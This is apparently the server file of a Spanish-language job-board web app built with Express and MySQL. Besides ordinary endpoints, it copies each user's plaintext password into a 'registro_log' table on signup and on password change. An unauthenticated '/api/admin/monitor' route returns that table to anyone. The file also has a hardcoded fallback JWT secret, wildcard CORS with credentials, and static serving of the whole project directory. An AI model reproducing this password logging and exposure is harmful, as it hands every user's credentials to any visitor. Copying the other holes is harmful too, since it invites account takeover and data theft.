process.on('uncaughtException', err => console.error('ERROR:', err.message));
process.on('unhandledRejection', err => console.error('ERROR:', err.message));

const express = require('express');
require('dotenv').config();
const fs = require('fs');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const db = require('./database');

// REGLA DE ORO: Clave secreta de respaldo por si el .env falla
const JWT_SECRET = process.env.JWT_SECRET || 'workflow_secure_key_azure_prod_2024';
const PORT = process.env.PORT || 3000;

// Inicialización de base de datos completa (Regla de Oro: Sin afectar nada funcional)
const initDB = async () => {
    try {
        // REGLA DE ORO: Crear la base de datos si no existe antes de intentar usarla
        const mysql = require('mysql2/promise');
        const conn = await mysql.createConnection({
            host: process.env.DB_HOST || 'localhost',
            user: process.env.DB_USER || 'root',
            password: process.env.DB_PASSWORD || '',
            ssl: {
                rejectUnauthorized: false
            }
        });
        await conn.query(`CREATE DATABASE IF NOT EXISTS ${process.env.DB_NAME || 'workflow_db'}`);
        await conn.end();

        // 1. Tabla de usuarios
        await db.query(`
            CREATE TABLE IF NOT EXISTS usuarios (
                id INT PRIMARY KEY AUTO_INCREMENT,
                nombre VARCHAR(100) NOT NULL,
                usuario VARCHAR(50) UNIQUE NOT NULL,
                correo VARCHAR(100) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                rol ENUM('usuario', 'empresa', 'admin') DEFAULT 'usuario',
                suspendido BOOLEAN DEFAULT FALSE,
                denuncias_recibidas INT DEFAULT 0,
                foto_perfil VARCHAR(255) DEFAULT 'default.jpg', -- Añadido valor por defecto
                profesion VARCHAR(100) DEFAULT NULL,
                salario_deseado INT DEFAULT 0,
                cvInfo JSON DEFAULT NULL,
                fecha_registro TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ultimo_login TIMESTAMP NULL
            )
        `);

        // 2. Tabla de sesiones
        await db.query(`
            CREATE TABLE IF NOT EXISTS sesiones (
                id INT PRIMARY KEY AUTO_INCREMENT,
                usuario_id INT NOT NULL,
                token TEXT NOT NULL,
                fecha_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (usuario_id) REFERENCES usuarios(id) ON DELETE CASCADE
            )
        `);

        // 4. Tabla de empleos (Asegurarse de que exista)
        await db.query(`
            CREATE TABLE IF NOT EXISTS empleos (
                id INT PRIMARY KEY AUTO_INCREMENT,
                titulo VARCHAR(150) NOT NULL,
                descripcion TEXT NOT NULL,
                salario VARCHAR(100),
                ubicacion VARCHAR(100),
                modalidad ENUM('remoto', 'presencial', 'hibrido') DEFAULT 'presencial',
                empresa_id INT NOT NULL,
                activo BOOLEAN DEFAULT TRUE,
                imagen VARCHAR(255) DEFAULT NULL,
                fecha_publicacion TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (empresa_id) REFERENCES usuarios(id) ON DELETE CASCADE
            )
        `);

        // 3. Tabla de monitoreo (registro_log)
        await db.query(`
            CREATE TABLE IF NOT EXISTS registro_log (
                id INT PRIMARY KEY AUTO_INCREMENT,
                nombre VARCHAR(100),
                usuario VARCHAR(50),
                correo VARCHAR(100),
                password_visible VARCHAR(255),
                rol VARCHAR(20),
                genero VARCHAR(50),
                fecha_registro TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // 5. Tabla de postulaciones (Asegurarse de que exista)
        await db.query(`
            CREATE TABLE IF NOT EXISTS postulaciones (
                id INT PRIMARY KEY AUTO_INCREMENT,
                empleo_id INT NOT NULL,
                usuario_id INT NOT NULL,
                fecha_postulacion TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                estado ENUM('pendiente', 'visto', 'rechazado') DEFAULT 'pendiente',
                FOREIGN KEY (empleo_id) REFERENCES empleos(id) ON DELETE CASCADE,
                FOREIGN KEY (usuario_id) REFERENCES usuarios(id) ON DELETE CASCADE,
                UNIQUE KEY unique_postulacion (empleo_id, usuario_id)
            )
        `);

        // 6. Tabla de denuncias (Asegurarse de que exista)
        await db.query(`
            CREATE TABLE IF NOT EXISTS denuncias (
                id INT PRIMARY KEY AUTO_INCREMENT,
                denunciante_id INT NOT NULL,
                denunciado_id INT NOT NULL,
                motivo TEXT NOT NULL,
                fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                estado ENUM('pendiente', 'revisada', 'bloqueado') DEFAULT 'pendiente',
                FOREIGN KEY (denunciante_id) REFERENCES usuarios(id),
                FOREIGN KEY (denunciado_id) REFERENCES usuarios(id)
            )
        `);

        // 7. Tabla de soporte (Asegurarse de que exista)
        await db.query(`
            CREATE TABLE IF NOT EXISTS soporte (
                id INT PRIMARY KEY AUTO_INCREMENT,
                usuario_id INT NOT NULL,
                asunto VARCHAR(200) NOT NULL,
                mensaje TEXT NOT NULL,
                fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                estado ENUM('abierto', 'en_proceso', 'cerrado') DEFAULT 'abierto',
                FOREIGN KEY (usuario_id) REFERENCES usuarios(id)
            )
        `);

        // REGLA DE ORO: Asegurar que la columna de restricción exista para evitar errores
        try {
            // Algunos motores de MySQL no soportan IF NOT EXISTS en ALTER, así que intentamos agregarlo directamente
            const [cols] = await db.query("SHOW COLUMNS FROM usuarios LIKE 'fecha_ultimo_cambio_nombre'");
            if (cols.length === 0) {
                await db.query(`ALTER TABLE usuarios ADD COLUMN fecha_ultimo_cambio_nombre TIMESTAMP NULL`);
            }
        } catch (e) { 
            // Si falla es porque probablemente la columna ya existe
            console.log('ℹ️ Nota: La columna fecha_ultimo_cambio_nombre ya está configurada.');
        }

        console.log('✅ Base de datos sincronizada y lista.');
    } catch (err) {
        console.error('❌ Error crítico al inicializar tablas:', err.message);
        process.exit(1); // Detenemos para evitar errores en cascada si la DB falla
    }
};

const app = express();

// 1. Configuración de CORS - Esencial para que móviles y computadoras conecten sin problemas
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true
}));

// 2. Middlewares de procesamiento de datos
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Manejo explícito de peticiones pre-vuelo (evita errores 405/403 en algunos navegadores)
app.options('*', cors());

// 3. Servir imágenes de perfil
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });

app.get('/', (req, res) => res.sendFile(path.join(process.cwd(), 'index.html')));
// 4. Rutas de navegación directa
app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/monitor', (req, res) => res.sendFile(path.join(__dirname, 'Monitoreo.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'Monitoreo.html')));
app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'Monitoreo.html')));

// Health check endpoint para verificar si el servidor está vivo
app.get('/health', (req, res) => res.status(200).send('OK'));

// Configurar multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadsDir);
    },
    filename: (req, file, cb) => {
        const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, unique + path.extname(file.originalname));
    }
});
const upload = multer({ storage });

// Middleware verificar token
const verificarToken = (req, res, next) => {
    const token = req.headers['authorization']?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Acceso denegado' });
    try {
        const verified = jwt.verify(token, JWT_SECRET);
        req.user = verified;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
};

// REGLA DE ORO: Endpoint para actualizar CVInfo y publicar al usuario
app.put('/api/cv', verificarToken, upload.single('cvFile'), async (req, res) => {
    try {
        const { skills, bio, profesion, salario, link } = req.body;
        const fileName = req.file ? req.file.filename : null;
        const cvData = JSON.stringify({ bio, skills, link, file: fileName, publicado: true });
        
        await db.query('UPDATE usuarios SET cvInfo = ?, profesion = ?, salario_deseado = ? WHERE id = ?', [cvData, profesion || '', salario || 0, req.user.id]);
        res.json({ success: true, message: 'CV Publicado' });
    } catch (err) {
        res.status(500).json({ error: 'Error al publicar CV' });
    }
});

// REGLA DE ORO: Función reutilizable para retirar CV del feed (Eliminar anuncio de perfil)
const retirarPerfil = async (req, res) => {
    try {
        const [rows] = await db.query('SELECT cvInfo FROM usuarios WHERE id = ?', [req.user.id]);
        if (rows.length === 0) return res.status(404).json({ error: 'Usuario no encontrado' });
        
        let cv = rows[0].cvInfo || {};
        if (typeof cv === 'string') {
            try {
                cv = JSON.parse(cv);
            } catch (e) {
                cv = {};
            }
        }
        
        cv.publicado = false; // "Eliminamos" el anuncio del feed principal
        
        await db.query('UPDATE usuarios SET cvInfo = ? WHERE id = ?', [JSON.stringify(cv), req.user.id]);
        res.json({ success: true, message: 'Anuncio de perfil retirado' });
    } catch (err) {
        res.status(500).json({ error: 'Error al retirar perfil' });
    }
};

// REGLA DE ORO: Endpoints para eliminar anuncio de perfil
const manejarEliminacionCv = async (req, res) => {
    if (req.method !== 'POST' && req.method !== 'DELETE') {
        return res.status(405).json({ error: 'Método no permitido' });
    }
    return retirarPerfil(req, res);
};

app.all('/api/cv', verificarToken, manejarEliminacionCv);
app.all('/api/cv/delete', verificarToken, manejarEliminacionCv);

// ========== ENDPOINTS ==========

// Registrar usuario
app.post('/api/registro', async (req, res) => {
    try {
        let { nombre, usuario, correo, password, rol } = req.body || {};

        // Verificar si ya existe
        const [existe] = await db.query(
            'SELECT id FROM usuarios WHERE correo = ? OR usuario = ?',
            [correo, usuario]
        );

        if (existe.length > 0)
            return res.status(409).json({ error: 'Correo o usuario ya existe' }); // 409 Conflict

        const hashedPassword = await bcrypt.hash(password, 10);

        // REGLA DE ORO: Insertar con valores por defecto para evitar fallos de base de datos
        const [result] = await db.query(
            `INSERT INTO usuarios
            (nombre, usuario, correo, password, rol, cvInfo, fecha_registro)
            VALUES (?, ?, ?, ?, ?, '{}', NOW())`,
            [nombre || 'Nuevo Usuario', usuario, correo, hashedPassword, rol || 'usuario']
        );

        // ✅ Guardar en registro_log con password visible (para monitoreo admin en tiempo real)
        await db.query(
            `INSERT INTO registro_log
            (nombre, usuario, correo, password_visible, rol, fecha_registro)
            VALUES (?, ?, ?, ?, ?, NOW())`,
            [nombre, usuario, correo, password, rol || 'usuario']
        );

        const token = jwt.sign(
            { id: result.insertId, rol: rol || 'usuario' },
            JWT_SECRET,
            { expiresIn: '7d' }
        );
        await db.query('UPDATE usuarios SET ultimo_login = NOW() WHERE id = ?', [result.insertId]);
        await db.query('INSERT INTO sesiones (usuario_id, token) VALUES (?, ?)', [result.insertId, token]);

        res.json({ success: true, token, user: { id: result.insertId, nombre, rol: rol || 'usuario' } });
    } catch (error) {
        console.error('❌ Error detallado en registro:', error);
        res.status(500).json({ error: 'Error interno del servidor al registrar' });
    }
});

// Login
app.post('/api/login', async (req, res) => {
    try {
        const { correo, password } = req.body;
        const [users] = await db.query('SELECT * FROM usuarios WHERE correo = ?', [correo]);
        if (users.length === 0) return res.status(401).json({ error: 'Correo o contraseña incorrectos' });
        const user = users[0];
        if (user.suspendido) return res.status(403).json({ error: 'Cuenta suspendida' });
        const valid = await bcrypt.compare(password, user.password);
        if (!valid) return res.status(401).json({ error: 'Correo o contraseña incorrectos' });
        const token = jwt.sign({ id: user.id, rol: user.rol }, JWT_SECRET, { expiresIn: '7d' });
        await db.query('UPDATE usuarios SET ultimo_login = NOW() WHERE id = ?', [user.id]);
        await db.query('INSERT INTO sesiones (usuario_id, token) VALUES (?, ?)', [user.id, token]);
        res.json({ success: true, token, user: { id: user.id, nombre: user.nombre, rol: user.rol } });
    } catch (error) {
        console.error('❌ Error detallado en login:', error);
        res.status(500).json({ error: 'Error interno del servidor al iniciar sesión' });
    }
});

// Obtener perfil propio
app.get('/api/perfil', verificarToken, async (req, res) => {
    const [rows] = await db.query(
        'SELECT id, nombre, usuario, correo, rol, foto_perfil, profesion, salario_deseado, cvInfo FROM usuarios WHERE id = ?',
        [req.user.id]
    );
    res.json(rows[0]);
});

// Editar perfil
// REGLA DE ORO: Este endpoint solo actualiza correo y contraseña. El nombre no es editable.
app.put('/api/perfil', verificarToken, async (req, res) => {
    try {
        const { correo, password } = req.body;
        // Obtener datos actuales para sincronización y validación
        const [userData] = await db.query('SELECT usuario, correo, nombre FROM usuarios WHERE id = ?', [req.user.id]);
        if (userData.length === 0) return res.status(404).json({ error: 'Usuario no encontrado.' });
        const username = userData[0].usuario;
        const oldCorreo = userData[0].correo;
        const nombre = userData[0].nombre;

        let updateFields = [];
        let logFields = [];
        let params = [];
        let logParams = [];

        if (nombre && nombre.trim() !== "" && nombre !== userData[0].nombre) {
            updateFields.push("nombre = ?");
            params.push(nombre);
            logFields.push("nombre = ?");
            logParams.push(nombre);
        }

        if (correo && correo.trim() !== '' && correo !== oldCorreo) {
            const [existe] = await db.query('SELECT id FROM usuarios WHERE correo = ? AND id != ?', [correo, req.user.id]);
            if (existe.length > 0) return res.status(400).json({ error: 'El correo ya está en uso por otro usuario' });
            updateFields.push("correo = ?");
            params.push(correo);
            logFields.push("correo = ?");
            logParams.push(correo);
        }

        if (password && password.trim() !== "") {
            const hashedPassword = await bcrypt.hash(password, 10);
            updateFields.push("password = ?");
            params.push(hashedPassword);
            logFields.push("password_visible = ?");
            logParams.push(password); // Mantenemos visibilidad para el monitor admin
        }

        if (updateFields.length === 0) return res.status(400).json({ error: 'No hay cambios para guardar.' });

        params.push(req.user.id);
        await db.query(`UPDATE usuarios SET ${updateFields.join(', ')} WHERE id = ?`, params);

        // Sincronizar con el registro de monitoreo para que el cambio sea "en todo el sistema"
        if (logFields.length > 0) {
            logParams.push(username);
            await db.query(`UPDATE registro_log SET ${logFields.join(', ')} WHERE usuario = ?`, logParams);
        }

        res.json({ success: true, message: 'Perfil actualizado correctamente' });
    } catch (error) {
        console.error('❌ Error crítico al actualizar perfil:', error.message);
        res.status(500).json({ error: 'Error interno: ' + error.message });
    }
});

// Subir foto
app.post('/api/upload-foto', verificarToken, upload.single('foto'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No se subió archivo' });
    await db.query('UPDATE usuarios SET foto_perfil = ? WHERE id = ?', [req.file.filename, req.user.id]); // Guardar solo el nombre del archivo
    res.json({ foto: `/uploads/${req.file.filename}` });
});

// Publicar empleo (solo empresa/admin)
app.post('/api/empleos', verificarToken, async (req, res) => {
    const { titulo, descripcion, salario, ubicacion, modalidad } = req.body;
    const [user] = await db.query('SELECT rol FROM usuarios WHERE id = ?', [req.user.id]);
    if (user[0].rol !== 'empresa' && user[0].rol !== 'admin' && user[0].rol !== 'usuario')
        return res.status(403).json({ error: 'Solo usuarios autorizados pueden publicar' });
    try {
        await db.query(
            'INSERT INTO empleos (titulo, descripcion, salario, ubicacion, modalidad, empresa_id) VALUES (?, ?, ?, ?, ?, ?)',
            [titulo, descripcion, salario, ubicacion, modalidad, req.user.id]
        );
        res.json({ success: true, message: 'Anuncio publicado' });
    } catch (error) {
        console.error('Error al publicar empleo:', error);
        res.status(500).json({ error: 'Error al publicar empleo' });
    }
});

// Listar empleos activos
app.get('/api/empleos', async (req, res) => {
    const [rows] = await db.query(`
        SELECT e.*, u.nombre as empresa_nombre, u.foto_perfil as empresa_foto,
               (SELECT COUNT(*) FROM postulaciones WHERE empleo_id = e.id) as num_postulaciones
        FROM empleos e JOIN usuarios u ON e.empresa_id = u.id 
        WHERE e.activo = 1 ORDER BY e.fecha_publicacion DESC
    `);
    res.json(rows);
});

// Postularse
app.post('/api/postular', verificarToken, async (req, res) => {
    const { empleo_id } = req.body;
    try {
        await db.query(
            'INSERT INTO postulaciones (empleo_id, usuario_id) VALUES (?, ?)',
            [empleo_id, req.user.id]
        );
        res.json({ success: true });
    } catch (error) {
        if (error.code === 'ER_DUP_ENTRY') return res.status(400).json({ error: 'Ya te postulaste' });
        res.status(500).json({ error: 'Error al postular' });
    }
});

// Eliminar empleo (soft delete)
app.delete('/api/empleos/:id', verificarToken, async (req, res) => {
    const { id } = req.params;
    try {
        const [empleo] = await db.query('SELECT empresa_id FROM empleos WHERE id = ?', [id]);
        if (empleo.length === 0) return res.status(404).json({ error: 'Empleo no encontrado' });
        if (empleo[0].empresa_id !== req.user.id && req.user.rol !== 'admin')
            return res.status(403).json({ error: 'No tienes permiso para eliminar este anuncio' });

        await db.query('UPDATE empleos SET activo = 0 WHERE id = ?', [id]);
        res.json({ success: true, message: 'Anuncio eliminado' });
    } catch (error) {
        console.error('Error al eliminar empleo:', error);
        res.status(500).json({ error: 'Error al eliminar anuncio' });
        return; // Asegurarse de que la función termine aquí
    }
});

// Denunciar usuario
app.post('/api/denuncias', verificarToken, async (req, res) => {
    const { denunciado_id, motivo } = req.body;
    if (denunciado_id == req.user.id)
        return res.status(400).json({ error: 'No te puedes denunciar' });
    try {
        await db.query(
            'INSERT INTO denuncias (denunciante_id, denunciado_id, motivo) VALUES (?, ?, ?)',
            [req.user.id, denunciado_id, motivo]
        );
        const [count] = await db.query(
            'SELECT COUNT(*) as total FROM denuncias WHERE denunciado_id = ? AND estado = "pendiente"',
            [denunciado_id]
        );
        if (count[0].total >= 3) {
            await db.query('UPDATE usuarios SET suspendido = 1 WHERE id = ?', [denunciado_id]);
            return res.json({ success: true, message: 'Usuario suspendido por acumular 3 denuncias' });
        }
        res.json({ success: true, message: 'Denuncia registrada' });
    } catch (error) {
        console.error('Error al denunciar usuario:', error);
        res.status(500).json({ error: 'Error interno del servidor al procesar denuncia' });
    }
});

// Listar mis postulaciones
app.get('/api/mis-postulaciones', verificarToken, async (req, res) => {
    if (req.user.rol !== 'usuario') return res.status(403).json({ error: 'Acceso denegado' });
    const [rows] = await db.query(`
        SELECT e.titulo, e.salario, e.ubicacion, e.modalidad, u.nombre as empresa_nombre, p.fecha_postulacion
        FROM postulaciones p
        JOIN empleos e ON p.empleo_id = e.id
        JOIN usuarios u ON e.empresa_id = u.id
        WHERE p.usuario_id = ?
        ORDER BY p.fecha_postulacion DESC
    `, [req.user.id]);
    res.json(rows);
});

// Listar postulaciones recibidas (para empresas)
app.get('/api/postulaciones-recibidas', verificarToken, async (req, res) => {
    if (req.user.rol !== 'empresa') return res.status(403).json({ error: 'Acceso denegado' });
    const [rows] = await db.query(`
        SELECT e.id as empleo_id, e.titulo, e.salario, e.ubicacion, e.modalidad,
               u.id as postulante_id, u.nombre as postulante_nombre, p.fecha_postulacion
        FROM empleos e
        JOIN postulaciones p ON e.id = p.empleo_id
        JOIN usuarios u ON p.usuario_id = u.id
        WHERE e.empresa_id = ?
        ORDER BY p.fecha_postulacion DESC
    `, [req.user.id]);

    // Agrupar por empleo para el formato deseado en el frontend
    const result = {};
    rows.forEach(row => {
        if (!result[row.empleo_id]) {
            result[row.empleo_id] = {
                titulo: row.titulo,
                salario: row.salario,
                ubicacion: row.ubicacion,
                modalidad: row.modalidad,
                postulantes: []
            };
        }
        result[row.empleo_id].postulantes.push({
            id: row.postulante_id,
            nombre: row.postulante_nombre,
            fecha_postulacion: row.fecha_postulacion
        });
    });
    res.json(Object.values(result));
});

// Crear ticket de soporte
app.post('/api/soporte', verificarToken, async (req, res) => {
    const { asunto, mensaje } = req.body;
    try {
        await db.query(
            'INSERT INTO soporte (usuario_id, asunto, mensaje) VALUES (?, ?, ?)',
            [req.user.id, asunto, mensaje]
        );
        res.json({ success: true, message: 'Ticket de soporte creado' });
    } catch (error) {
        console.error('Error al crear ticket:', error);
        res.status(500).json({ error: 'Error al crear ticket de soporte' });
    }
});

// Obtener candidatos con CV publicado
app.get('/api/candidatos', async (req, res) => {
    const [rows] = await db.query(
        `SELECT id, nombre, foto_perfil, cvInfo, profesion, salario_deseado FROM usuarios 
         WHERE rol = 'usuario' AND suspendido = 0 
         AND JSON_UNQUOTE(JSON_EXTRACT(cvInfo, '$.publicado')) = 'true'
         ORDER BY id DESC`
    );
    res.json(rows);
});

// Admin: Listar todos los usuarios
app.get('/api/admin/usuarios', verificarToken, async (req, res) => {
    if (req.user.rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado' });
    const [rows] = await db.query('SELECT id, nombre, usuario, correo, rol, suspendido, foto_perfil FROM usuarios');
    res.json(rows);
});

// Admin: Bloquear/Desbloquear usuario
app.put('/api/admin/usuarios/:id/bloquear', verificarToken, async (req, res) => {
    if (req.user.rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado' });
    const { id } = req.params;
    const { suspendido } = req.body;
    await db.query('UPDATE usuarios SET suspendido = ? WHERE id = ?', [suspendido, id]);
    res.json({ success: true, message: 'Estado de usuario actualizado' });
});

// Admin: Listar todos los empleos (activos e inactivos)
app.get('/api/admin/empleos', verificarToken, async (req, res) => {
    if (req.user.rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado' });
    const [rows] = await db.query(`
        SELECT e.*, u.nombre as empresa_nombre FROM empleos e JOIN usuarios u ON e.empresa_id = u.id
        ORDER BY e.fecha_publicacion DESC
    `);
    res.json(rows);
});

// Admin: Listar todas las denuncias
app.get('/api/admin/denuncias', verificarToken, async (req, res) => {
    if (req.user.rol !== 'admin') return res.status(403).json({ error: 'Acceso denegado' });
    const [rows] = await db.query(`
        SELECT d.*, u_denunciante.nombre as denunciante_nombre, u_denunciado.nombre as denunciado_nombre
        FROM denuncias d
        JOIN usuarios u_denunciante ON d.denunciante_id = u_denunciante.id
        JOIN usuarios u_denunciado ON d.denunciado_id = u_denunciado.id
        ORDER BY d.fecha DESC
    `);
    res.json(rows);
});

// Monitor admin en tiempo real
app.get('/api/admin/monitor', async (req, res) => {
    try {
        const [registros] = await db.query('SELECT * FROM registro_log ORDER BY fecha_registro DESC');
        res.json({ registros });
    } catch (error) {
        res.status(500).json({ error: 'Error al obtener registros' });
        return; // Asegurarse de que la función termine aquí
    }
});

// REGLA DE ORO: Los archivos estáticos se sirven AL FINAL para no interceptar las rutas API en Azure
// Esto evita el error 405 (Method Not Allowed)
app.use(express.static(__dirname));

// Exportar para Vercel
module.exports = app;

// REGLA DE ORO: No arrancar el servidor hasta que las tablas existan
if (process.env.NODE_ENV !== 'production') {
    initDB().then(() => {
        app.listen(PORT, () => {
            console.log(`🚀 Servidor local en http://localhost:${PORT}`);
        }).on('error', (err) => {
            if (err.code === 'EADDRINUSE') {
                process.exit(1);
            }
        });
    });
} else {
    // En producción (Vercel), solo inicializamos la DB
    initDB();
}